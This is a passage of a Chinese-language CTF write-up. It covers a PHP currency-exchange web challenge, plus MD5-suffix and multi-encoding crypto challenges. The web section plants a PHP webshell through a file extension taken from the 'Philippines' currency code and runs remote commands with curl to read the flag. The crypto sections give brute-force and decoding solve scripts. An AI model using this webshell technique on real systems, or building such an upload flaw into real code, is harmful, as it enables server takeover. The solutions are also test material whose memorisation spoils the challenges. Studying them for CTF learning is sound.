        "Andorra" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Angola" => array("ISO" => "AOA", "toTWD" => 0.87),
        "Anguilla" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Antigua and Barbuda" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Argentina" => array("ISO" => "ARS", "toTWD" => 0.87),
        "Armenia" => array("ISO" => "AMD", "toTWD" => 0.87),
        "Artsakh" => array("ISO" => "none", "toTWD" => 0.87),
        "Aruba" => array("ISO" => "AWG", "toTWD" => 0.87),
        "Ascension Island" => array("ISO" => "SHP", "toTWD" => 0.87),
        "Australia" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Austria" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Azerbaijan" => array("ISO" => "AZN", "toTWD" => 0.87),
        "Bahamas, The" => array("ISO" => "BSD", "toTWD" => 0.87),
        "Bahrain" => array("ISO" => "BHD", "toTWD" => 0.87),
        "Bangladesh" => array("ISO" => "BDT", "toTWD" => 0.87),
        "Barbados" => array("ISO" => "BBD", "toTWD" => 0.87),
        "Belarus" => array("ISO" => "BYN", "toTWD" => 0.87),
        "Belgium" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Belize" => array("ISO" => "BZD", "toTWD" => 0.87),
        "Benin" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Bermuda" => array("ISO" => "BMD", "toTWD" => 0.87),
        "Bhutan" => array("ISO" => "BTN", "toTWD" => 0.87),
        "Bolivia" => array("ISO" => "BOB", "toTWD" => 0.87),
        "Bonaire" => array("ISO" => "USD", "toTWD" => 0.87),
        "Bosnia and Herzegovina" => array("ISO" => "BAM", "toTWD" => 0.87),
        "Botswana" => array("ISO" => "BWP", "toTWD" => 0.87),
        "Brazil" => array("ISO" => "BRL", "toTWD" => 0.87),
        "British Indian Ocean Territory" => array("ISO" => "USD", "toTWD" => 0.87),
        "British Virgin Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Brunei" => array("ISO" => "BND", "toTWD" => 0.87),
        "Bulgaria" => array("ISO" => "BGN", "toTWD" => 0.87),
        "Burkina Faso" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Burundi" => array("ISO" => "BIF", "toTWD" => 0.87),
        "Cambodia" => array("ISO" => "KHR", "toTWD" => 0.87),
        "Cameroon" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Canada" => array("ISO" => "CAD", "toTWD" => 0.87),
        "Cape Verde" => array("ISO" => "CVE", "toTWD" => 0.87),
        "Cayman Islands" => array("ISO" => "KYD", "toTWD" => 0.87),
        "Central African Republic" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Chad" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Chile" => array("ISO" => "CLP", "toTWD" => 0.87),
        "China, People's Republic of" => array("ISO" => "CNY", "toTWD" => 0.87),
        "Colombia" => array("ISO" => "COP", "toTWD" => 0.87),
        "Comoros" => array("ISO" => "KMF", "toTWD" => 0.87),
        "Congo, Democratic Republic of the" => array("ISO" => "CDF", "toTWD" => 0.87),
        "Congo, Republic of the" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Cook Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Costa Rica" => array("ISO" => "CRC", "toTWD" => 0.87),
        "Côte d'Ivoire" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Croatia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Cuba" => array("ISO" => "CUP", "toTWD" => 0.87),
        "Curaçao" => array("ISO" => "ANG", "toTWD" => 0.87),
        "Cyprus" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Czech Republic" => array("ISO" => "CZK", "toTWD" => 0.87),
        "Denmark" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Djibouti" => array("ISO" => "DJF", "toTWD" => 0.87),
        "Dominica" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Dominican Republic" => array("ISO" => "DOP", "toTWD" => 0.87),
        "East Timor" => array("ISO" => "USD", "toTWD" => 0.87),
        "Ecuador" => array("ISO" => "USD", "toTWD" => 0.87),
        "Egypt" => array("ISO" => "EGP", "toTWD" => 0.87),
        "El Salvador" => array("ISO" => "USD", "toTWD" => 0.87),
        "Equatorial Guinea" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Eritrea" => array("ISO" => "ERN", "toTWD" => 0.87),
        "Estonia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Eswatini" => array("ISO" => "SZL", "toTWD" => 0.87),
        "Ethiopia" => array("ISO" => "ETB", "toTWD" => 0.87),
        "Falkland Islands" => array("ISO" => "FKP", "toTWD" => 0.87),
        "Faroe Islands" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Fiji" => array("ISO" => "FJD", "toTWD" => 0.87),
        "Finland" => array("ISO" => "EUR", "toTWD" => 0.87),
        "France" => array("ISO" => "EUR", "toTWD" => 0.87),
        "French Polynesia" => array("ISO" => "XPF", "toTWD" => 0.87),
        "French Southern and Antarctic Lands" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Gabon" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Gambia, The" => array("ISO" => "GMD", "toTWD" => 0.87),
        "Georgia" => array("ISO" => "GEL", "toTWD" => 0.87),
        "Germany" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Ghana" => array("ISO" => "GHS", "toTWD" => 0.87),
        "Gibraltar" => array("ISO" => "GIP", "toTWD" => 0.87),
        "Greece" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Greenland" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Grenada" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Guatemala" => array("ISO" => "GTQ", "toTWD" => 0.87),
        "Guinea" => array("ISO" => "GNF", "toTWD" => 0.87),
        "Guinea-Bissau" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Guyana" => array("ISO" => "GYD", "toTWD" => 0.87),
        "Haiti" => array("ISO" => "HTG", "toTWD" => 0.87),
        "Honduras" => array("ISO" => "HNL", "toTWD" => 0.87),
        "Hong Kong" => array("ISO" => "HKD", "toTWD" => 0.87),
        "Hungary" => array("ISO" => "HUF", "toTWD" => 0.87),
        "Iceland" => array("ISO" => "ISK", "toTWD" => 0.87),
        "India" => array("ISO" => "INR", "toTWD" => 0.87),
        "Indonesia" => array("ISO" => "IDR", "toTWD" => 0.87),
        "Iran" => array("ISO" => "IRR", "toTWD" => 0.87),
        "Iraq" => array("ISO" => "IQD", "toTWD" => 0.87),
        "Ireland" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Isle of Man" => array("ISO" => "none", "toTWD" => 0.87),
        "Israel" => array("ISO" => "ILS", "toTWD" => 0.87),
        "Italy" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Jamaica" => array("ISO" => "JMD", "toTWD" => 0.87),
        "Japan" => array("ISO" => "JPY", "toTWD" => 0.87),
        "Jersey" => array("ISO" => "none", "toTWD" => 0.87),
        "Jordan" => array("ISO" => "JOD", "toTWD" => 0.87),
        "Kazakhstan" => array("ISO" => "KZT", "toTWD" => 0.87),
        "Kenya" => array("ISO" => "KES", "toTWD" => 0.87),
        "Kiribati" => array("ISO" => "none", "toTWD" => 0.87),
        "Korea, North" => array("ISO" => "KPW", "toTWD" => 0.87),
        "Korea, South" => array("ISO" => "KRW", "toTWD" => 0.87),
        "Kosovo" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Kuwait" => array("ISO" => "KWD", "toTWD" => 0.87),
        "Kyrgyzstan" => array("ISO" => "KGS", "toTWD" => 0.87),
        "Laos" => array("ISO" => "LAK", "toTWD" => 0.87),
        "Latvia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Lebanon" => array("ISO" => "LBP", "toTWD" => 0.87),
        "Lesotho" => array("ISO" => "LSL", "toTWD" => 0.87),
        "Liberia" => array("ISO" => "LRD", "toTWD" => 0.87),
        "Libya" => array("ISO" => "LYD", "toTWD" => 0.87),
        "Liechtenstein" => array("ISO" => "CHF", "toTWD" => 0.87),
        "Lithuania" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Luxembourg" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Macau" => array("ISO" => "MOP", "toTWD" => 0.87),
        "Madagascar" => array("ISO" => "MGA", "toTWD" => 0.87),
        "Malawi" => array("ISO" => "MWK", "toTWD" => 0.87),
        "Malaysia" => array("ISO" => "MYR", "toTWD" => 0.87),
        "Maldives" => array("ISO" => "MVR", "toTWD" => 0.87),
        "Mali" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Malta" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Marshall Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Mauritania" => array("ISO" => "MRU", "toTWD" => 0.87),
        "Mauritius" => array("ISO" => "MUR", "toTWD" => 0.87),
        "Mexico" => array("ISO" => "MXN", "toTWD" => 0.87),
        "Micronesia" => array("ISO" => "USD", "toTWD" => 0.87),
        "Moldova" => array("ISO" => "MDL", "toTWD" => 0.87),
        "Monaco" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Mongolia" => array("ISO" => "MNT", "toTWD" => 0.87),
        "Montenegro" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Montserrat" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Morocco" => array("ISO" => "MAD", "toTWD" => 0.87),
        "Mozambique" => array("ISO" => "MZN", "toTWD" => 0.87),
        "Myanmar" => array("ISO" => "MMK", "toTWD" => 0.87),
        "Namibia" => array("ISO" => "NAD", "toTWD" => 0.87),
        "Nauru" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Nepal" => array("ISO" => "NPR", "toTWD" => 0.87),
        "Netherlands" => array("ISO" => "EUR", "toTWD" => 0.87),
        "New Caledonia" => array("ISO" => "XPF", "toTWD" => 0.87),
        "New Zealand" => array("ISO" => "NZD", "toTWD" => 0.87),
        "Nicaragua" => array("ISO" => "NIO", "toTWD" => 0.87),
        "Niger" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Nigeria" => array("ISO" => "NGN", "toTWD" => 0.87),
        "Niue" => array("ISO" => "NZD", "toTWD" => 0.87),
        "North Macedonia" => array("ISO" => "MKD", "toTWD" => 0.87),
        "Northern Cyprus" => array("ISO" => "TRY", "toTWD" => 0.87),
        "Norway" => array("ISO" => "NOK", "toTWD" => 0.87),
        "Oman" => array("ISO" => "OMR", "toTWD" => 0.87),
        "Pakistan" => array("ISO" => "PKR", "toTWD" => 0.87),
        "Palau" => array("ISO" => "USD", "toTWD" => 0.87),
        "Palestine" => array("ISO" => "ILS", "toTWD" => 0.87),
        "Panama" => array("ISO" => "PAB", "toTWD" => 0.87),
        "Papua New Guinea" => array("ISO" => "PGK", "toTWD" => 0.87),
        "Paraguay" => array("ISO" => "PYG", "toTWD" => 0.87),
        "Peru" => array("ISO" => "PEN", "toTWD" => 0.87),
        "Philippines" => array("ISO" => "PHP", "toTWD" => 0.87),
        "Pitcairn Islands" => array("ISO" => "NZD", "toTWD" => 0.87),
        "Poland" => array("ISO" => "PLN", "toTWD" => 0.87),
        "Portugal" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Qatar" => array("ISO" => "QAR", "toTWD" => 0.87),
        "Romania" => array("ISO" => "RON", "toTWD" => 0.87),
        "Russia" => array("ISO" => "RUB", "toTWD" => 0.87),
        "Rwanda" => array("ISO" => "RWF", "toTWD" => 0.87),
        "Saba" => array("ISO" => "USD", "toTWD" => 0.87),
        "Sahrawi Republic" => array("ISO" => "MAD", "toTWD" => 0.87),
        "Saint Helena" => array("ISO" => "SHP", "toTWD" => 0.87),
        "Saint Kitts and Nevis" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Saint Lucia" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Saint Pierre and Miquelon" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Samoa" => array("ISO" => "WST", "toTWD" => 0.87),
        "Saint Barthélemy" => array("ISO" => "EUR", "toTWD" => 0.87),
        "San Marino" => array("ISO" => "EUR", "toTWD" => 0.87),
        "São Tomé and Príncipe" => array("ISO" => "STN", "toTWD" => 0.87),
        "Saudi Arabia" => array("ISO" => "SAR", "toTWD" => 0.87),
        "Senegal" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Serbia" => array("ISO" => "RSD", "toTWD" => 0.87),
        "Seychelles" => array("ISO" => "SCR", "toTWD" => 0.87),
        "Sierra Leone" => array("ISO" => "SLE", "toTWD" => 0.87),
        "Singapore" => array("ISO" => "SGD", "toTWD" => 0.87),
        "Sint Eustatius" => array("ISO" => "USD", "toTWD" => 0.87),
        "Sint Maarten" => array("ISO" => "ANG", "toTWD" => 0.87),
        "Slovakia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Slovenia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Solomon Islands" => array("ISO" => "SBD", "toTWD" => 0.87),
        "Somalia" => array("ISO" => "SOS", "toTWD" => 0.87),
        "South Africa" => array("ISO" => "ZAR", "toTWD" => 0.87),
        "South Ossetia" => array("ISO" => "RUB", "toTWD" => 0.87),
        "South Sudan" => array("ISO" => "SSP", "toTWD" => 0.87),
        "Spain" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Sri Lanka" => array("ISO" => "LKR", "toTWD" => 0.87),
        "Sudan" => array("ISO" => "SDG", "toTWD" => 0.87),
        "Suriname" => array("ISO" => "SRD", "toTWD" => 0.87),
        "Sweden" => array("ISO" => "SEK", "toTWD" => 0.87),
        "Switzerland" => array("ISO" => "CHF", "toTWD" => 0.87),
        "Syria" => array("ISO" => "SYP", "toTWD" => 0.87),
        "Taiwan / Republic of China" => array("ISO" => "TWD", "toTWD" => 0.87),
        "Tajikistan" => array("ISO" => "TJS", "toTWD" => 0.87),
        "Tanzania" => array("ISO" => "TZS", "toTWD" => 0.87),
        "Thailand" => array("ISO" => "THB", "toTWD" => 0.87),
        "Togo" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Tonga" => array("ISO" => "TOP", "toTWD" => 0.87),
        "Transnistria" => array("ISO" => "RUB", "toTWD" => 0.87),
        "Trinidad and Tobago" => array("ISO" => "TTD", "toTWD" => 0.87),
        "Tunisia" => array("ISO" => "TND", "toTWD" => 0.87),
        "Turkey" => array("ISO" => "TRY", "toTWD" => 0.87),
        "Turkmenistan" => array("ISO" => "TMT", "toTWD" => 0.87),
        "Turks and Caicos Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Tuvalu" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Uganda" => array("ISO" => "UGX", "toTWD" => 0.87),
        "Ukraine" => array("ISO" => "UAH", "toTWD" => 0.87),
        "United Arab Emirates" => array("ISO" => "AED", "toTWD" => 0.87),
        "United Kingdom" => array("ISO" => "GBP", "toTWD" => 0.87),
        "United States" => array("ISO" => "USD", "toTWD" => 0.87),
        "Uruguay" => array("ISO" => "UYU", "toTWD" => 0.87),
        "Uzbekistan" => array("ISO" => "UZS", "toTWD" => 0.87),
        "Vanuatu" => array("ISO" => "VUV", "toTWD" => 0.87),
        "Vatican City" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Venezuela" => array("ISO" => "VES", "toTWD" => 0.87),
        "Vietnam" => array("ISO" => "VND", "toTWD" => 0.87),
        "Wallis and Futuna" => array("ISO" => "XPF", "toTWD" => 0.87),
        "Yemen" => array("ISO" => "YER", "toTWD" => 0.87),
        "Zambia" => array("ISO" => "ZMW", "toTWD" => 0.87),
        "Zimbabwe" => array("ISO" => "none", "toTWD" => 0.87),
    );
    ```
    :::
* index.php
    :::spoiler Source Code
    ```php=
    <?php
    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
    include("currency.php");

    $resultLink = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $region = $_POST["region"];
        $amount = $_POST["amount"];

        $isoName = $countryData[$region]["ISO"];
        $rate = $countryData[$region]["toTWD"];

        $convertedAmount = $amount * $rate ?: $amount;

        $htmlContent = "<html><body>";
        $htmlContent .= "<h1> Exchange result </h1>";
        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";

        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
        file_put_contents($filePath, $htmlContent);

        $resultLink = "<a href='" . $filePath . "'> 👁️ exchange result</a>";
    }
    ?>

    <!DOCTYPE html>
    <html>
    <head>
        <title>🪙Exchange Station</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.css" />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.js"></script>

        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet" />

    </head>
    <body>
        <div class="ts-segment">
            <div class="ts-app-navbar is-fluid">
                <a class="item">
                    <div class="ts-icon is-house-icon"></div>
                    <div class="label">Home</div>
                </a>
            </div>
        </div>
        <br>
        <br>
        <div class="ts-container is-very-narrow">
        <fieldset class="ts-fieldset">
        <legend>🪙Exchange Station</legend>
            <form action="" method="post">
                <label for="region">🌏Region</label>
                <div class="ts-select">
                    <select name="region" id="region">
                        <?php foreach ($countryData as $region => $data): ?>
                            <option value="<?php echo $region; ?>"><?php echo $region; ?></option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <br>
                <br>
                <div class="ts-input is-labeled">
                    <span class="label">💵Amount </span>
                    <input type="text" id="amount" name="amount" required>
                    <span class="label">TWD</span>
                </div>
                <br>
                <button class="ts-button">Submit</button>
            </form>
            <?php
            if ($resultLink) {
                echo $resultLink;
            }
            ?>
            </fieldset>
        </div>
    </body>
    </html>
    ```
    :::
#### Recon
這一題是賽後解，所以參考了官解，其實我快要接近答案了，思考的邏輯也沒有錯，只是真的不夠細心，沒有觀察到小巧思
1. 先觀察dockerfile，可以發現我們要找的flag就是在根目錄，所以沒意外應該是要拿到shell
2. 再看這隻程式在幹麻
    這個網站就只有轉換匯率的功能，轉換匯率的table就放在currency.php，首先前端可選擇要轉換的國家幣值，然後填入數字他就會把這兩個parameters存成一個檔案，接著我們就可query他
3. 出現問題的code
    ```php=
    <?php
    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
    include("currency.php");

    $resultLink = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $region = $_POST["region"];
        $amount = $_POST["amount"];

        $isoName = $countryData[$region]["ISO"];
        $rate = $countryData[$region]["toTWD"];

        $convertedAmount = $amount * $rate ?: $amount;

        $htmlContent = "<html><body>";
        $htmlContent .= "<h1> Exchange result </h1>";
        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";

        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
        file_put_contents($filePath, $htmlContent);

        $resultLink = "<a href='" . $filePath . "'> 👁️ exchange result</a>";
    }
    ?>
    ```
    前一段所說的功能就是這一段在做的事情，而從docker後台也可以看到一樣的狀況
    ![image](https://hackmd.io/_uploads/Hy9HFqgop.png)
    在docker中的/upload/就會存成這樣的內容
    ![image](https://hackmd.io/_uploads/S1MOY9esa.png)
    所以是不是我們可以填入最基本的webshell後，當我們query這個file時就自動跑起來
4. 遭遇的困難
    如果只是利用剛剛的狀態直接寫`<?php system($_GET['sh']); ?>`，會不成功，原因是雖然後端還是儲存成一個看起來像webshell的內容但是，送到前端被render後會被當作一般的comment，這也是我一開始卡的地方
    ![image](https://hackmd.io/_uploads/rkqK9cesT.png)
5. How to solve?
    可以觀察前面的dockerfile，倒數第二行的
    > AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP
    根據chatgpt:
    > 在Apache的配置文件 `/etc/apache2/apache2.conf` 中添加 `AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP` 的意思是告訴Apache服務器將以 `.php`, `.Php`, `.pHp`, `.phP`, `.pHP`, `.PHp`, `.PHP` 結尾的文件視為PHP腳本文件進行解析和執行。這樣做可以確保Apache在收到這些文件請求時，將它們交給PHP解釋器處理，而不是簡單地將它們作為靜態文件發送給客戶端。

    (也就是說如果作者沒有加上這一段的話就不用玩了，應該ㄅ...)

    所以我們要做的就很簡單了,看哪一個國家的縮寫是php相關的，只要選取該國家，後端就會把檔案取名成`.PHP`，翻了一下currency.php發現是==菲律賓==，所以只要選取菲律賓，並且用最簡單的php websehll就可以達到RCE
    ![image](https://hackmd.io/_uploads/SkOzHCeia.png)
6. 成功RCE
    Payload: 
    ```url
    http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls
    ```
    ![image](https://hackmd.io/_uploads/B1RBr0ljp.png)

#### Exploit - Upload Webshell
Payload: 
```bash
$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls%20/"
<html><body><h1> Exchange result </h1><p>bin
boot
dev
etc
flag-lMXptmyC
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=cat%20/flag-lMXptmyC"
<html><body><h1> Exchange result </h1><p>TSCCTF{FAKEFLAG}
 TWD = TSCCTF{FAKEFLAG}
 PHP</p><a href='/'>Back to Home</a></body></html>%
```
## Crypto
### CCcollision
#### Source Code
:::spoiler
```python=
from hashlib import md5
from string import ascii_lowercase, digits
from random import choice
from secret import FLAG

def get_random_string(length):
    return "".join([choice(ascii_lowercase + digits) for _ in range(length)])

prefix = get_random_string(5)
hashed = md5(get_random_string(30).encode()).hexdigest()

print("here is your prefix: " + prefix)
print("your hash result must end with: " + hashed[-6:])

user_input = input("Enter the string that you want to hash: ")
user_hash = md5(user_input.encode()).hexdigest()

if user_input[:5] == prefix and user_hash[-6:] == hashed[-6:]:
    print(FLAG)
```
:::
#### Exploit
就是一般常見的pow要算的collision

```pyton=
from pwn import *
from hashlib import md5
import os
from string import ascii_lowercase, digits
from random import choice

r = remote('172.31.200.2', 40004)

def get_random_string(length):
    return "".join([choice(ascii_lowercase + digits) for _ in range(length)])

print(r.recvuntil(b'here is your prefix: '))
prefix = r.recvline()[:-1]
print(r.recvuntil(b'your hash result must end with: '))
ended = r.recvline()[:-1].decode()

log.info(f"{prefix=}\n{ended=}")

while True:
    ans = prefix + get_random_string(8).encode()
    user_hash = md5(ans).hexdigest()
    # print(user_hash)
    if ans[:5] == prefix and user_hash[-6:] == ended[-6:]:
        log.success("Find Collision~~~")
        r.sendlineafter(b'Enter the string that you want to hash: ', ans)
        break
print(r.recvline())
r.interactive()
```

Flag: `TSC{2a92efd3d9886caa0bc437f236b5b695c54f43dc9bdb7eec0a9af88f1d1e0bee}`
### Encoded not Encrypted
#### Source Code
:::spoiler
```python=
from random import choice, randint
from string import ascii_uppercase
from secret import FLAG

words = open("./Crypto/Encode not Encrypt/fasttrack.txt").read().splitlines()
selected = [choice(words) for _ in range(100)]
assert all(word in words for word in selected)
ans = " ".join(selected)

def a(s):
    return "".join(hex(ord(c))[2:] for c in s)

b_chars = 'zyxwvutsrqponmlkjihgfedcba'
def b(s):
    result = ""
    for c in s:
        binary = f'{ord(c):08b}'
        front, back = binary[:4], binary[4:]
        result += b_chars[int(front, 2)] + b_chars[int(back, 2)]
    return result

c_chars = '?#%='
def c(s):
    result = ""
    for c in s:
        binary = f'{ord(c):08b}'
        for i in range(0, 8, 2):
            result += c_chars[int(binary[i:i+2], 2)]
    return result

def d(s):
    return "".join(oct(ord(c))[2:] for c in s)

func = {0: a, 1: b, 2: c, 3: d}
encodeds = []
hint = ""
for word in selected:
    num = randint(0, 3)
    encodeds.append(func[num](word))
    for bit in f'{num:02b}':
        ch = choice(ascii_uppercase)
        hint += ch if bit == '1' else ch.lower()

print(selected)
print(" ".join(encodeds))
print(hint)

user_input = input("Enter the answer: ")
if user_input == ans:
    print(FLAG)

```
:::
#### Exploit
這一題作者有放水，因為其實在轉換八進制的地方可以很難，撇除掉這個部分其實用chatGPT幫忙生一下code再local debug一下，應該不用半小時，source code中簡單的流程就是，他會從wordlist中抽選100個words，然後隨機給不同的encode方式，包含
1. 轉換成hex 
2. 2. 依照字元的low / high bytes做到scramble 
3. 3. 和上一個大同小異，依照每兩個bits做到scramble 
4. 4. 轉換成八進制

作者有給hint，我們可以根據hint知道他是用哪一個方式encode，而最難的地方是八進制，因為不同的printable char會決定轉換後是三個char還是兩個char，假設原本的plaintext是==Summer2011==，這種同時包含數字和英文，encode完會變成==12316515515514516262606161==，但是其中英文的部分他是每三個string構成，而數字的部分就是每兩個string構成，如果只是知道他用八進制的方式encode，應該沒有辦法解決這樣的狀況，目前也還沒想到相對應的解法
```python=
from pwn import *
import string

r = remote('172.31.200.2', 42816)

encoded = r.recvline()[:-1].decode().split(' ')
hint = r.recvline()[:-1].decode()
# encoded = "vysusvsutmtlwxwzwyws #%#?#%?##=#?#%?##%?%#%?##=?=#%## #=?=#=??#=?%#%%##%=%#%#=?=?%?=???=?#?=?= ?=?#?=?#?=?#?=?#?=?#?=?# #=?=#%?##=?=#%?# swtusxsttusx tntusvtmtutqtl 146151162145 70617373 tytvtmtqtltqswsvtysvtksx 141144155151156163 77696e74657232303132 swtutwsxtusv 6d6f6e6b6579 70726976617465 163145162166145162 12316515515514516262606165 ustutntwtktmtuwywxww swsutmtmtusxwxwzwzwr ustqtlsvtusxwxwzwywu swtutwsusxtqsvsq swtltkss 57656c636f6d6531323132 swsutmtmtusxwxwzwzwr #=?=#%###%?=#=?%#%###=#??%?# 163161154 uzvzwuwusswzsxtvxy 146151162145 61646d696e61646d696e ##??#????=##?=###=#=?=??#=?%#%#??%?# 53756d6d657232303131 74657374 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 7374617277617273 73716c70617373 ##?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 61646d696e69737461746f72 #%#=#%==#%?##=#? #%#?#=?%#%?##%#=#%==#%=% swsutmtmtusxwxwzwywz tysusvsutmtlwxwzwywu ###=#%%##%=%#=#?#%###=?%?=?%?=???=?#?=#% sutltotltksstl 163157155145144141171 155157156153145171 #%?=#%==#%=##=??#%?##%=%#=%#?=?#?%?# #=?##=#=#%###=?%#=#?#=%# 313233343536 syty 6561727468 svtuswsvxmswsytnww twtrtytltstu 163145143162145164616263 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 6e6574776f726b73 504073737730726421 141144155151156163 123161154163145162166145162 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=## uzvzswswsswzsxtvxy 144162141147157156 uwsutmtmtusxwxwzwyws 6d6f6e6b6579 ##??#???#=?=#=?=#=#=#%==#=?%#%#??%?# 504035357730726421 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 163145143162145164616263 646576646576 73656372657421 twtktmsztytlsqwyxy 57696e74657232303133 ustqtlsvtusxwxwzwywy wqwu 6368616e6765 143157155160141156171616263 146151162145 163157155145144141171 tltusvsstksxtotqtlts swsytnswtusxsttusxwxwzwzwu 7365637265743121 170160 537072696e6732303134 6e6574776f726b696e67 #%=%#=#? 141144155151156 7870 70617373776f7264313233 #%?%#%%##=?%#%#? 12010065651676016214441 16316115462606071 #=?=#%###%?=#=###=?%#%%##=#?#=%# ?=%#?=## #=?=#=%##=?=#%?##%#?#%=##%%##%=% #=#?#%###=?=#=#?#=#?#%###=?=#=#? 74657374696e67313233 #%?##%#?#%=##%%##%=% 737072696e6732303137 143150141156147145 12316515515514516262606161 tysusvsutmtlwxwzwyws".split(' ')
# hint = 'rETwKtXdNrgIdKGNvhuXWXqtkOpcfzTEKKvQcNzIsPxLgyvQMxOWnDZOunIyujxcNnbsvbOqwoYmUtlWlBUfyGDLXIOoVcyqyMkcjQbKBNUtabauLFHZLqaNOSvVvrFhbkWdHWsdrjkAcxvViRfkGGLTTFkShPujVXgunhBmPCvmugHeTVDXKhVwHvPuftKdmlZJIBrI'
ascii_lower = string.ascii_lowercase
ascii_higher = string.ascii_uppercase

def dec_a(s):
    return bytes.fromhex(s).decode('utf-8')

b_chars = 'zyxwvutsrqponmlkjihgfedcba'
def dec_b(s):
    res = ''
    for i in range(0, len(s), 2):
        front = b_chars.find(s[i])
        back = b_chars.find(s[i+1])
        bin = f'{front:04b}' + f'{back:04b}'
        res += chr(int(bin, 2))
    return res

c_chars = '?#%='
def dec_c(s):
    result = ""
    for i in range(0, len(s), 4):
        binary_chunk = ""
        for j in range(4):
            binary_chunk += f'{c_chars.index(s[i + j]):02b}'
        result += chr(int(binary_chunk, 2))
    return result
    
# def dec_d(s):
#     s = [s[i:i+2] for i in range(0, len(s), 2)]
#     return "".join(chr(int(i, 8)) for i in s)

def decode_octal(encoded_str):
    octal_chunks = [encoded_str[i:i+3] for i in range(0, len(encoded_str), 3)]
    decoded_str = "".join(chr(int(chunk, 8)) for chunk in octal_chunks)
    return decoded_str

answer = b""
for i in range(len(encoded)):
    if hint[i*2] in ascii_lower and hint[i*2+1] in ascii_lower:
        answer += dec_a(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_lower and hint[i*2+1] in ascii_higher:
        answer += dec_b(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_lower:
        answer += dec_c(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_higher:
        answer += decode_octal(encoded[i]).encode() + b' '

print(answer)
r.sendlineafter(b'Enter the answer: ', answer[:-1])
r.interactive()
```
### Baby staRburSt streAm
#### Source Code
:::spoiler
```python=
print(
"""
      />_________________________________
[########[]_________________________________>
